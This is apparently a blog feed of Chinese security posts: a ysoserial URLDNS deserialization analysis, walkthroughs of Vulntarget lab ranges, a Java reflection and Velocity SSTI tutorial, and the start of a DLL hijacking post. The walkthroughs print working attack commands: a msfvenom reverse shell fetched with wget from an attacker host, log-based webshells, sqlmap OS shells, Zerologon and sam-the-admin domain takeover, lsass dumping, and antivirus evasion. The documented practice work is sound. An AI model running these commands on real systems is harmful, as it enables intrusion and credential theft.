因为handler是URLStreamHandler，所以后面需要调用URLStreamHandler类的**hashCode()**方法 确实到了URLStreamHandler类的**hashCode()方法中，我们重点关注getHostAddress()**方法 发现进入getHostAddress()方法后调用了getHost()和getByName()方法，通过查阅文档，发现InetAddress.getByName方法是用来获取主机ip地址的，如果是一个url，则会进行一次dns查询。当前dnslog解析记录为空 执行完这句话之后可以看到了dnslog上收到了解析记录。 那么到此为止payload生成就结束了，调用链为 1234HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode()-&gt;URLStreamHandler.hashCode().getHostAddress-&gt;URLStreamHandler.hashCode().getHostAddress-&gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName 但是在这里只是生成payload，并不希望发送真正的dnslog解析请求，所以需要上面代码注释的部分，重写URLStreamHandler的getHostAddress()方法，使得exp只生成payload而不发送dnslog解析请求。我们这一步的目的是生成payload且不发送dns解析请求所以重写了上述方法，而生成payload打过去之后目标服务肯定不会重写这个方法。 在payload生成完之后通过输出流写到文件中，至此payload生成分析结束。 payload反序列化调用分析12345678910111213141516171819202122232425262728293031323334353637package ysoserial.test;import java.io.*;import java.lang.reflect.Field;import java.net.*;import java.util.HashMap;public class URLDNStest implements Serializable &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; URLStreamHandler handler= new URLStreamHandler() &#123; @Override protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125; &#125;; HashMap ht=new HashMap(); String url=&quot;http://test.5.0x4.cc&quot;; URL u=new URL(null,url,handler); ht.put(u,url); Field hashcode=u.getClass().getDeclaredField(&quot;hashCode&quot;); hashcode.setAccessible(true); hashcode.set(u,-1); ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(&quot;D:\\\\javaVulnsStu\\\\ysoserial\\\\test.data&quot;)); stream.writeObject(ht); //反序列化生成的payload ObjectInputStream stream1 = new ObjectInputStream(new FileInputStream(&quot;D:\\\\javaVulnsStu\\\\ysoserial\\\\test.data&quot;)); stream1.readObject(); &#125;&#125; 重点看最后两行代码，在Java中使用readobject方法反序列化对象，在hashmap中也下断点调试一下 在跟到putval的时候， 发现后面会调用到在**u.hostAddress = InetAddress.getByName(host);**下的断点，跟进去就可以看到下一步就是进行域名解析了 后面dnslog平台也受到了解析请求 参考链接https://lucifer-rossweisse.github.io/2022/04/10/web%E5%AD%A6%E4%B9%A0/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%93%BE%E5%AD%90 https://cloud.tencent.com/developer/article/1940432 https://www.cnblogs.com/nice0e3/p/13772184.html","categories":[],"tags":[],"author":"Polo"},{"title":"vulntarget-d WriteUp","slug":"vulntarget-d-WriteUp","date":"2022-04-14T14:53:01.000Z","updated":"2022-04-14T14:53:01.000Z","comments":true,"path":"2022/04/14/vulntarget-d-WriteUp/","link":"","permalink":"https://polosec.github.io/2022/04/14/vulntarget-d-WriteUp/","excerpt":"","text":"外网打点192.168.255.134 nmap先扫一下 尝试访问80与81端口，结果只有81端口可以访问，是骑士cms 74cms v6.0.20 查看版本，找一下公开漏洞。这cms好熟悉 之前肯定打过 https://www.cnblogs.com/twlr/p/14142870.html 直接getshell 信息搜集 64位Ubuntu www用户，双网卡 192.168.68.0/24 192.168.255.0/24,发现主机255.254 先上msf，开socks代理，然后尝试提权 提权linux_exploit_suggester CVE-2021-4034 然后拿root权限改下密码 服务器没装openssh server，由于通外网直接给他装一个 1sed -i &#39;&#x2F;PermitRootLogin &#x2F;c PermitRootLogin yes&#39; &#x2F;etc&#x2F;ssh&#x2F;sshd_config 激活root远程登陆并且上线msf 内网信息搜集上传fscan搜集一波 搜集完发现Windows主机68.129，80端口hello world，dirsearch扫一下发现phpmyadmin http://192.168.68.129/phpmyadmin/ 内网主机1http://192.168.68.129/phpmyadmin/ 弱口令root/root上去，尝试getshell。 secure_file_priv为NULL，无法直接写文件getshell，尝试日志getshell 日志getshell set global general_log = “ON”; 还差一个绝对路径，正好泄露了phpinfo 修改日志文件 set global general_log_file = “C:/phpstudy/PHPTutorial/WWW/shell.php”; 上蚁剑,msf自带socks代理麻了，还是gost吧 kali： ubuntu： 还是先上线msf，gost多层转发 上线msf思路如下：内网主机1连接外网主机5001端口，外网主机监听5001 转发到kali5001，kali msf监听5001 外网主机：./gost-linux-amd64 -L=:5001/192.168.255.132:5001 有火绒，生成shellcode先免杀 提权msf getsystem直接得到system权限,当前不在域环境，不考虑域渗透。 凭证获取load kiwi creds_all crow WIN-D4S86JO2R26 209c6174da490caeb422f3fa5a7ae634 7c87541fd3f3ef5016e12d411900c87a6046a8e8 解密得到密码admin 开启338912345reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allowreg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f最后一句话解决mstsc报错问题 开完3389系统崩了 懒得再弄一次了 草。","categories":[],"tags":[],"author":"Polo"},{"title":"Vulntarget-c WriteUp","slug":"Vulntarget-c-WriteUp","date":"2022-04-04T16:00:15.000Z","updated":"2022-04-04T16:00:15.000Z","comments":true,"path":"2022/04/05/Vulntarget-c-WriteUp/","link":"","permalink":"https://polosec.github.io/2022/04/05/Vulntarget-c-WriteUp/","excerpt":"","text":"外网打点http://192.168.255.133/ nmap扫描之后发现22端口和80端口，尝试对22端口进行爆破失败，于是考虑对80端口渗透。 打开看到是laravel，开启xray扫一下，扫到了CVE-2021-3129，尝试利用 https://github.com/ambionics/phpggc https://github.com/SNCKER/CVE-2021-3129 目录结构如下 修改main里面代码获得一个shell 上线msfmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.255.132 LPORT=4444 -f elf -o 1.elf kali：python3 -m http.server 80 受害机：wget http://192.168.255.132/1.elf -O /tmp/1.elf chmod u+x /tmp/1.elf /tmp/1.elf msf: run post/multi/manage/autoroute 信息搜集上传fscan、看arp收集内网主机信息，查看arp表发现10.0.20.100主机，开个socks代理上去，可以看到10.0.20.100跑了web服务，先放这里不管了。 提权当前是www-data用户，权限较低，尝试使用exploit suggester等方法失败后，发现home目录下存在vulntarget用户，弱口令root上去，sudo -l，可以看到当前用户是有root权限的 直接以当前用户sudo elf文件： sudo passwd root 直接改掉root密码即可获取root权限 内网主机1http://10.0.20.100/ Windows php8 http://10.0.20.100/admin/ admin admin123弱口令上去，首先找上传，模板修改点，没找到。 搜到了一个sql注入，但是msf的代理不太稳定，传一个gost开socks代理 受害跳板：gost -L=:5001/192.168.255.132:5000 12345678910111213141516171819GET &#x2F;admin&#x2F;inquiries&#x2F;view_details.php?id&#x3D;1 HTTP&#x2F;1.1Host: 10.0.20.100User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http:&#x2F;&#x2F;10.0.20.100&#x2F;admin&#x2F;?page&#x3D;inquiriesCookie: PHPSESSID&#x3D;ndd4l701jdk2un19ijjhufgc39GET &#x2F;admin&#x2F;inquiries&#x2F;view_details.php?id&#x3D;1 HTTP&#x2F;1.1Host: 10.0.20.100User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http:&#x2F;&#x2F;10.0.20.100&#x2F;admin&#x2F;?page&#x3D;inquiriesCookie: PHPSESSID&#x3D;ndd4l701jdk2un19ijjhufgc39 python3 sqlmap.py -u “http://10.0.20.100/admin/inquiries/view_details.php?id=1&quot; –os-shell 查看权限，是system权限，还不错。 上线msf利用sqlmap的文件上传尝试传马，但是失败了，看下是不是有杀软 有defender，尝试免杀下 免杀过后一直无法上线，考虑是防火墙问题，修改一下，使用gost端口转发上线： 跳板机1监听5001，受害机2连接跳板机1的5001，跳板机1的5001转发至kali的5000，kali msf监听5000 信息搜集net time /domain 和net user /domain 判断后机器不在域环境 添加路由，发现10.0.10.0/24网段，扫一下 发现主机10.0.10.110存活，开放了22端口 凭证收集 kiwi模块dump hash，解密得管理员密码Admin#123 开338912345reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allowreg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f最后一句话解决mstsc报错问题 上去之后发现有个mobaxterm，猜一下密码就是登陆密码，上去了 内网主机2发现mobaXterm的主机ip地址和刚才扫到的一致，双击直接登陆进去了，传一下linux_exploit_suggester试试 1gcc cve-2021-4034-poc.c -o cve-2021-4034-poc 提权https://github.com/briskets/CVE-2021-3493 kali编译一下然后传过去，直接提到root权限。 上线msf内网主机2 反向连接内网主机1的5005端口，内网主机1监听5005转发到外网主机5006，外网主机监听5006转发到5007，msf监听5007. msfvenom生成的木马host写内网主机1的同网卡ip，port写5005. 最后成功上线msf","categories":[],"tags":[],"author":"Polo"},{"title":"Vulntarget-a WriteUp","slug":"Vulntarget-a-WriteUp","date":"2022-03-31T15:11:45.000Z","updated":"2022-03-31T15:11:45.000Z","comments":true,"path":"2022/03/31/Vulntarget-a-WriteUp/","link":"","permalink":"https://polosec.github.io/2022/03/31/Vulntarget-a-WriteUp/","excerpt":"","text":"外网打点http://192.168.248.141/ 通达OA 直接尝试工具利用 上蚁剑看到system权限。。直接不用提权了 上cs进行内网渗透与信息收集 内网信息搜集上传fscan，扫了一下192.168.248网段没其他收获，扫一下另一张网卡10网段的主机 通过tailor scan 和nbtscan发现了10.0.20.99主机 查看当前主机是否在域内 net time /domain也报错，判断当前机器不在域内，直接打另一张网卡的99主机。 凭证获取直接mimikatz 获得密码明文 admin 内网主机1ip地址10.0.20.99，从外网主机开个socks代理 浏览器访问20.99,hello world 扫了下目录只有phpinfo，暴露了绝对路径。 没有其他利用点，但是发现开了6379端口， 方式一 绝对路径 redis写shell参考链接http://wjlshare.com/archives/1283 访问1.php system权限。。 方式二 一键利用脚本端口转发上线待补充，全部打完后再弄 主机信息搜集双网卡，10.0.20.99 10.0.10.111 查询是否在域 查看域管理员 1net group &quot;enterprise admins&quot; /domain 尝试获取dc ip dc ip 10.0.10.110 看下arp缓存 无其他可用信息，fscan扫描一下，也是只有DC信息，不管了，先上cs再说。 凭证收集 先上传procdump dump下lsass文件 1procdump64.exe -accepteula -ma lsass.exe lsass.dmp 1mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 注意一点，上传的mimikatz是32位，使用掩日免杀编译的时候也是32位，但是到了本地解的时候需要使用64位的mimikatz。 解一下hash 得到主机账号密码 win2016 Admin#123 上线cs第二台主机上线cs绕了很多弯路，说一下历程吧。 首先是win7开防火墙，win7禁用了管理员，使用cs的system权限修改管理员密码，然后3389上去编辑本地策略取消禁用管理员。 使用命令net user Administrator /active:yes激活管理员失败。 win7允许管理员登陆后，一直没上线，考虑是防火墙原因，netsh advfirewall set currentprofile state off 关闭了win7的防火墙，同样关闭了win2016的防火墙 接下来是pivot中继上线cs，大坑，因为中继上线无法生成shellcode，但是目标主机有defender，只能想办法免杀，然而掩日并不能免杀cs的exe文件，所以只能采用web-delivery方法获取32位shellcode然后手动免杀，然而python形式的shellcode获取并解码过后shellcode格式是”\\\\xff”形式，需要去掉一个反斜线，要不然也上不了线，踩了大坑。获取shellcode后使用掩日免杀，编译去掉64位编译选项，生成，上传，上线。 域控根据上面收集的信息，dc为10.0.10.110，搞个代理访问到DC先,直接通过cs再开一个socks，proxifier/proxychains配置代理链 CVE-2020-1472先利用漏洞把密码重置为空，然后dump出来hash 1proxychains python3 secretsdump.py vulntarget.com&#x2F;win2019\\$@10.0.10.110 -no-pass 然后利用smbexec拿到shell 12proxychains python3 smbexec.py -hashes ad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com&#x2F;administrator@10.0.10.110 添加用户，添加管理员 1234567net user polowong Admin@polo123 &#x2F;add命令成功完成。C:\\Windows\\system32&gt;net localgroup administrators polowong &#x2F;add命令成功完成。 开3389 123reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow hash还原如果机器账户hash长时间为空，可能会导致脱域，对内网的使用产生重大影响，因此拿到权限的第一时间需要把hash重置回去。 1234reg save HKLM\\SYSTEM system.savereg save HKLM\\SAM sam.savereg save HKLM\\SECURITY security.save 然后在当前shell目录生成这三个文件，c/windows/system32 通过mstsc拷回来，考到kali，使用secretdump解析 1python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 使用脚本 https://github.com/risksense/zerologon 还原hash proxychains python3 reinstall_original_pw.py win2019 10.0.10.110 70312b76f3ee31850203aff8c224f454 可以了，测试下用原来的密码也可以登录，并且用secretdump no-pass 利用失败 上线cs一样的方法拿出shellcode然后做免杀，上传上线","categories":[],"tags":[],"author":"Polo"},{"title":"Vulntarget-b WriteUp","slug":"Vulntarget-b-WriteUp","date":"2022-03-24T08:55:56.000Z","updated":"2022-03-24T08:55:56.000Z","comments":true,"path":"2022/03/24/Vulntarget-b-WriteUp/","link":"","permalink":"https://polosec.github.io/2022/03/24/Vulntarget-b-WriteUp/","excerpt":"","text":"外网打点外部信息搜集目标地址：http://192.168.248.140:81/ nmap扫描后发现可利用端口为3306和81，分别是mysql与http服务 发现极致cms，尝试从网上搜索相关漏洞，弱口令，默认后台地址 web cms渗透 弱口令admin/admin123进入后台 进入后台后首先尝试上传，允许上传文件类型添加php后多次尝试依旧上传失败，尝试其他利用方法，参考链接https://cn-sec.com/archives/318500.html，使用的方法为添加插件修改模板代码，嵌入php代码。 配置好密码后，可以看到现在已经有了网站模板编辑权限 尝试在index.php嵌入一句话木马，成功。 上蚁剑，可以连接，但是无法执行命令，考虑绕过disable_function disable_function绕过使用蚁剑插件绕过disable_function 主机信息搜集ifconfig/ip a 无回显，先上msf看一下网络信息 有两个网段，192.168.248.0/24 192.168.159.0/24 添加路由，启动socks代理 配置proxifier，尝试访问159网段 没问题，进行159网段的信息搜集 使用TailorScan 发现192.168.159.129:8080 访问发现是禅道CMS 内网主机1192.168.159.129主机开放了8080与3306端口，分别是http与mysql服务，8080端口部署了禅道系统。 web 渗透漏洞利用：https://blog.csdn.net/qq_36197704/article/details/109385695 弱口令admin/Admin123进入后台 由于漏洞利用需要访问服务器文件，该主机不出网，所以需要在第一台centos起一个web服务放payload python -m SimpleHTTPServer 1234 访问后文件存在，进行下一步利用 1http://192.168.159.129:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzE5Mi4xNjguMTU5LjEzMDoxMjM0LzEucGhw 上传完成后尝试访问 http://192.168.159.129:8080/data/client/1/1.php 没问题，上蚁剑 上线msf看一下有哪些杀软 tasklist /svc 然后掩日识别一下 发现有火绒，尝试上一下msf，由于该机器不出外网，需要在centos使用ew做一下端口转发，并且需要对生成的shellcode进行免杀。 msf免杀火绒使用掩日进行免杀 centos配置端口转发弱口令ssh进去centos，systemctl stop firewalld.service 关闭防火墙,使用gost进行端口转发 centos 1235端口收到的请求将转发至248.133主机的8887端口 运行exe文件 进程迁移run post/windows/manage/migrate 自动迁移进程 添加路由与收集网段信息可以看到有10.0.10.0/24网段信息，添加路由 上传fscan收集信息 提权尝试了几个suggester提供的方法均失败，直接getsystem就可以了，昨天提权失败应该是因为msf没更新 dump hashdump hash需要管理员权限，所以上一步提权，手动尝试添加用户被火绒拦截了，所以只能dump hash load kiwi creds_all 去解一下NTLM HASH https://www.objectif-securite.ch/ophcrack 得到密码admin#123,尝试远程桌面登录 run post/windows/manage/enable_rdp 登陆不上，没有授权，没办法只能去打域控了 内网信息搜集ip地址10.0.10.99 arp表 fscan信息 可以看到已经定位出了DC 定位域控参考 https://security.tencent.com/index.php/blog/msg/154 net user /domain net time /domain ping一下DC，得到IP地址，可以看到与fscan的扫描结果一致。 域控CVE-2021-4228712https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;sam-the-admin.gitpython3 -m pip install -r requirements.txt 这个脚本只能在kali使用，kali自带了smbexec 需要修改源码 proxychains python3 sam_the_admin.py “vulntarget.com/win101:admin#123” -dc-ip 10.0.10.100 -shell 开3389123reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow 添加用户net user polo admin@123 /add net localgroup administrators polo /add 使用kali的remmina工具登录，mstsc应该是因为ssl配置问题上不去 dump hash上传procdump，利用42287获得的shell执行下面命令 procdump64.exe -accepteula -ma lsass.exe lsass.dmp 然后将得到的lsass.dmp文件拷贝至本地 本地执行 1mimikatz.exe &#96;&#96;&quot;sekurlsa::minidump lsass.dmp&quot;&#96; &#96;&quot;sekurlsa::logonPasswords full&quot;&#96; &#96;exit 拿到NTLM-hash结果，尝试解密Administrator 570a9a65db8fba761c1008a51d4c95ab","categories":[],"tags":[],"author":"Polo"},{"title":"Java安全基础-反射学习","slug":"Java安全基础-反射学习","date":"2022-03-07T16:29:14.000Z","updated":"2022-03-07T16:30:27.000Z","comments":true,"path":"2022/03/08/Java安全基础-反射学习/","link":"","permalink":"https://polosec.github.io/2022/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Java执行系统命令cmd相关参数cmd /c dir 是执行完dir命令后关闭命令窗口。 cmd /k dir 是执行完dir命令后不关闭命令窗口。 cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。 cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。 windows下执行命令的几种方式 Windows下调用程序 Process proc =Runtime.getRuntime().exec(“exefile”); 1Process proc1 =Runtime.getRuntime().exec(&quot;notepad&quot;); Windows下调用系统命令 String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};Process proc =Runtime.getRuntime().exec(cmd); 123456789String cmd[]=&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;whoami&quot;&#125;; Process proc2=Runtime.getRuntime().exec(cmd); InputStream is=proc2.getInputStream(); BufferedReader br=new BufferedReader(new InputStreamReader(is)); String res; while ((res=br.readLine())!=null) &#123; System.out.println(res); &#125; Windows下调用系统命令并弹出命令行窗口 String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};Process proc =Runtime.getRuntime().exec(cmd); 12String cmd[]=&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;start&quot;,&quot;dir&quot;&#125;;Process proc2=Runtime.getRuntime().exec(cmd); Linux下执行命令的几种方式 Linux下调用程序 Process proc =Runtime.getRuntime().exec(“./exefile”); Linux下调用系统命令 String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};Process proc =Runtime.getRuntime().exec(cmd); Linux下调用系统命令并弹出命令行窗口 String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};Process proc =Runtime.getRuntime().exec(cmd); Java反射相关知识先说一个不成熟的结论，个人对Java反射的理解类似python jinja2模板渲染引擎SSTI漏洞中找RCE利用链一样：从当前类找到object类（forName/__base__），在从object类的子类中找到存在命令执行方法的子类(runtime.getruntime()/subclasses())，最后找到命令执行方法(exec/popen) Java反射是在运行状态中对于任意一个类都可以找到这个类的类名，构造方法，成员方法，属性。这种动态获取对象属性的机制称为Java的反射机制。 反射的优点与缺点优点：反射机制可以实现动态创建对象和编译，体现出很大的灵活性，特别是在J2EE的开发者他的灵活性就表现得十分明显。例如，在一个大型软件的开发中，当程序被编译后发布，如果以后需要更新某些功能的时候，我们不可能要用户把以前软件的卸载，再重新安装新的版本。采用静态的话，需要把整个程序重新编译一次才可以实现功能的更新，而采用反射机制的话，它就可以不用卸载，只需要在运行时才动态的创建和编译，就可以实现该功能。 缺点：对性能有影响。反射机制其实是一种解释操作，我们通过告诉JVM，我们希望做什么并且他们组我们的要求。这类操作总是慢于只直接执行相同的操作 Class类Class类是所有类的类，对于普通的对象，新建一个对象的实例如下： Demo demo = new Demo(); 但是不能直接用Class cls=new Class();去创建一个class类，因为Class类的构造方法是私有的，不允许被外部调用构建。 然而我们可以通过其他方法获取到class类： ```javaDemo demo=new Demo(); Class cls=demo.getclass(); 1232. &#96;&#96;&#96;java Class cls2&#x3D;Demo.class; ```javaClass cls3=Class.forName(“com.org.ReflectDemo.Demo”) 123456789101112131415获取到Class对象之后，可以通过反射机制获取到对象的信息。## Java反射相关方法&#96;&#96;&#96;javapublic Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F;获得该类所有的方法，不包括父类public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有public的方法，包括父类。第一二个参数可以指定特定的方法，比如exec(String)和exec(String[])，通过第一个参数指定exec，第二个参数指定String 或者String[] 可以定位不同的方法。public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的构造方法public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的public构造方法 包括父类public Field getDeclaredField(String name)&#x2F;&#x2F;获得该类所有的声明变量，不包括父类public Field getField(String name)&#x2F;&#x2F;获得该类所有的public声明变量，包括父类writeObject（）&#x2F;&#x2F;序列化，将Object输出成Byte流readObject（）&#x2F;&#x2F;反序列化，将Byte流输出成Objectinvoke() invoke()的作用是执行(call)方法，正常的方法调用顺序为 object.method(p1,p2,p3) 使用invoke的调用顺序为method.invoke(object,p1,p2,p3) getMethod方法重载：通过指定方法名和方法参数类型确定唯一一个方法。 java 单例模式Runtime的构造器是私有的，所以不可以直接new一个Runtime的对象。 这里搬运下runoob的介绍： 单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。 注意： 1、单例类只能有一个实例。 2、单例类必须自己创建自己的唯一实例。 3、单例类必须给所有其他对象提供这一实例。 个人理解单例模式就是一个类只有一个实例化对象在类内部，需要的时候就调用，全局仅维护这一个实例化对象，调用的时候没有就创建，有就返回实例化对象。这个实例化对象有的话只能有一个。 示例一： Runtime的构造器属性为私有是有原因的，这是一种”单例模式”，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取： 12345678910public class TrainDB &#123;private static TrainDB instance = new TrainDB();public static TrainDB getInstance() &#123;return instance;&#125;private TrainDB() &#123; db.conn();// 建立连接的代码...&#125;&#125; 示例二： 创建一个 Singleton 类。 1234567891011121314151617public class SingleObject &#123; //创建 SingleObject 的一个对象 private static SingleObject instance = new SingleObject(); //让构造函数为 private，这样该类就不会被实例化 private SingleObject()&#123;&#125; //获取唯一可用的对象 public static SingleObject getInstance()&#123; return instance; &#125; public void showMessage()&#123; System.out.println(&quot;Hello World!&quot;); &#125;&#125; 从 singleton 类获取唯一的对象。\\ 1234567891011121314public class SingletonPatternDemo &#123; public static void main(String[] args) &#123; //不合法的构造函数 //编译时错误：构造函数 SingleObject() 是不可见的 //SingleObject object = new SingleObject(); //获取唯一可用的对象 SingleObject object = SingleObject.getInstance(); //显示消息 object.showMessage(); &#125;&#125; java反射demo1234//reflection demo 1 Class c2=Class.forName(&quot;java.lang.Runtime&quot;); Object o1=c2.getMethod(&quot;getRuntime&quot;).invoke(null,null); c2.getMethod(&quot;exec&quot;, String.class).invoke(o1,&quot;calc&quot;); 如果一个类的构造方法为私有，可以执行，不过需要一些操作：使用getDeclearedConstructor获取所有构造方法，设置可访问标记为true即可。 12345//reflection demo 2 Class c1=Class.forName(&quot;java.lang.Runtime&quot;); Constructor cs=c1.getDeclaredConstructor(); cs.setAccessible(true); c1.getMethod(&quot;exec&quot;,String.class).invoke(cs.newInstance(),&quot;notepad&quot;); java反射rce-SSTIvelocity ssti，参考链接https://samny.blog.csdn.net/article/details/104881477 具体模板语言不讲了，根据payload 1?template&#x3D;%23set($e&#x3D;&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;) 直接debug 一步步跟踪，跟踪到evaluate方法发现将String类型的输入转为了Reader类型：Reader是一个抽象类，它是以字符为单位的输入流的公共父类。 继续跟踪到parse方法 继续跟parse方法 进入init方法后 继续跟，跟到render方法 继续跟进去看render方法 跟到后面发现execute方法，像invoke的调用方法，继续跟进去看看 又是一个execute方法，继续跟 哈哈，终于找到了眼熟的getMethod和invoke方法 这样循环走下去，接下来是runtime，Runtime.getruntime()，exec(“calc”)。 最终弹出来了计算器 #参考链接 https://samny.blog.csdn.net/article/details/104881477https://www.sec-in.com/article/307https://le1a.gitee.io/posts/916c2e64/https://blog.csdn.net/m0_38103658/article/details/105482035https://cloud.tencent.com/developer/article/1607776","categories":[],"tags":[],"author":"Polo"},{"title":"DLL劫持基础及红队武器化","slug":"DLL劫持基础及红队武器化","date":"2022-03-01T14:36:40.000Z","updated":"2022-03-01T14:36:40.000Z","comments":true,"path":"2022/03/01/DLL劫持基础及红队武器化/","link":"","permalink":"https://polosec.github.io/2022/03/01/DLL%E5%8A%AB%E6%8C%81%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%8C%96/","excerpt":"","text":"什么是DLL DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。 DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。 DLL加载顺序一、Windows XP SP2之前 Windows查找DLL的目录以及对应的顺序： 进程对应的应用程序所在目录； 当前目录（Current Directory）； 系统目录（通过 GetSystemDirectory 获取）； 16位系统目录； Windows目录（通过 GetWindowsDirectory 获取）； PATH环境变量中的各个目录； 例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。 二、在Windows xp sp2之后 Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）： 默认注册表为：HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode，其键值为1 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）； 系统目录（即%windir%system32）； 16位系统目录（即%windir%system）； Windows目录（即%windir%）； 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）； PATH环境变量中的各个目录； 三、Windows7以上 系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置： 